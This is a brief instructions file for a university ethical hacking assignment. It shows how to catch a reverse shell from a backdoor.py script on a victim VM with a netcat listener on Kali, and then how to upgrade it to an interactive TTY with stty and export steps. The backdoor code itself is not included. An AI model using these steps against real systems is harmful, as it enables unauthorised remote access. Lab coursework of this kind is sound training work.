documentation for CSCI369 Ethical Hacking assignment Q1

attacker kali vm to run (ensure kali is using bash)
	nc -lvnp 5555

backdoor.py is to be run on victim ubuntu vm
	python3 backdoor.py

reverse shell should appear on kali terminal

this creates a non-interactive reverse shell

to upgrade to interactive shell in kali, perform the following steps on kali side
(referenced from https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
1. when reverse shell is open, press "Ctrl-Z" to send shell to background
2. enter stty -a and note down rows and columns number
3. bring shell back, enter fg
4. enter reset
5. enter export SHELL=bash
6. enter export TERM=xterm256-color
7. enter stty rows <row number from step1> columns <column number from step2>
8. interactive shell now working

I have tested vi to edit files. It works.